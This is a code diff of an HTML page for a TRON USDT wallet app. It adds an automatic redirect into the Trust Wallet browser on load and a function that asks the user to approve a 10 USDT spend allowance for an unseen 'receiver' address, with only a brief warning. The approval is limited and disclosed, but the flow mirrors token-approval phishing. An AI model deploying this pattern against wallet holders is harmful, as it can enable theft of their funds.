@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>USDT TRON Actions</title>
+  <title>TRON USDT dApp</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <style>
@@ -28,7 +28,7 @@
 
     .title {
       font-size: 20px;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
     }
 
     .btn {
@@ -41,19 +41,21 @@
       margin-top: 10px;
     }
 
-    .pay { background: #22c55e; color: white; }
-    .approve { background: #f59e0b; color: white; }
+    .connect { background: #3b82f6; }
+    .pay { background: #22c55e; }
+    .approve { background: #f59e0b; }
 
-    .info {
-      margin-top: 15px;
-      font-size: 13px;
+    .address {
+      margin-top: 10px;
+      font-size: 12px;
       color: #9ca3af;
+      word-break: break-all;
     }
 
-    .status {
+    .info {
+      font-size: 12px;
+      color: #9ca3af;
       margin-top: 10px;
-      font-size: 13px;
-      color: #22c55e;
     }
   </style>
 </head>
@@ -62,23 +64,25 @@
 
   <div class="card">
 
-    <div class="title">USDT (TRON)</div>
+    <div class="title">TRON USDT dApp</div>
 
-    <!-- ✅ PAYMENT -->
-    <button class="btn pay" onclick="pay()">
-      Send 10 USDT
+    <!-- CONNECT BUTTON -->
+    <button id="connectBtn" class="btn connect" onclick="connectWallet()">
+      Connect TRON Wallet
     </button>
 
-    <!-- ⚠️ APPROVAL -->
-    <button class="btn approve" onclick="startApproveFlow()">
-      Approve 10 USDT (permission)
-    </button>
+    <!-- WALLET ADDRESS -->
+    <div id="address" class="address"></div>
 
-    <div class="info">
-      Approval allows this address to spend your USDT later. This is NOT a payment.
+    <!-- ACTION BUTTONS -->
+    <div id="actions" style="display:none;">
+      <button class="btn pay" onclick="pay()">Send 10 USDT</button>
+      <button class="btn approve" onclick="approve()">Approve 10 USDT</button>
+
+      <div class="info">
+        Approval allows spending later. This is NOT a payment.
+      </div>
     </div>
-
-    <div id="status" class="status"></div>
 
   </div>
 
@@ -87,52 +91,54 @@
     const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const AMOUNT = 10 * 1e6;
 
-    // ✅ PAYMENT (always works)
+    // 🔥 Auto open inside Trust Wallet if not already
+    window.onload = () => {
+      if (!window.tronWeb) {
+        const url = encodeURIComponent(window.location.href);
+        window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
+      }
+    };
+
+    // ✅ Connect Wallet
+    function connectWallet() {
+      if (!window.tronWeb) {
+        alert("Opening Trust Wallet...");
+        return;
+      }
+
+      const address = window.tronWeb.defaultAddress.base58;
+
+      if (!address) {
+        alert("Please unlock wallet");
+        return;
+      }
+
+      document.getElementById("address").innerText =
+        "Connected: " + address;
+
+      document.getElementById("connectBtn").style.display = "none";
+      document.getElementById("actions").style.display = "block";
+    }
+
+    // ✅ Payment
     function pay() {
       const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
       window.location.href = url;
     }
 
-    // 🟡 START APPROVE FLOW
-    function startApproveFlow() {
-
-      document.getElementById("status").innerText = "Opening wallet...";
-
-      // If NOT inside wallet → open wallet browser
+    // ⚠️ Approval
+    function approve() {
       if (!window.tronWeb) {
-        const url = encodeURIComponent(window.location.href + "?approve=1");
-        window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
+        alert("Wallet not detected");
         return;
       }
-
-      // Inside wallet → trigger approve
-      approve();
-    }
-
-    // 🟡 APPROVE FUNCTION (must be user-triggered)
-    function approve() {
-      document.getElementById("status").innerText = "Waiting for wallet approval...";
 
       window.tronWeb.contract().at(CONTRACT).then(contract => {
         contract.approve(receiver, AMOUNT).send({
           feeLimit: 100000000
-        }).then(tx => {
-          document.getElementById("status").innerText = "Approved successfully ✅";
-        }).catch(err => {
-          document.getElementById("status").innerText = "Approval cancelled ❌";
         });
       });
     }
-
-    // 🔥 HANDLE REDIRECT CASE
-    window.addEventListener("load", () => {
-      const params = new URLSearchParams(window.location.search);
-
-      if (params.get("approve") === "1") {
-        document.getElementById("status").innerText =
-          "Tap 'Approve' again to continue";
-      }
-    });
   </script>
 
 </body>
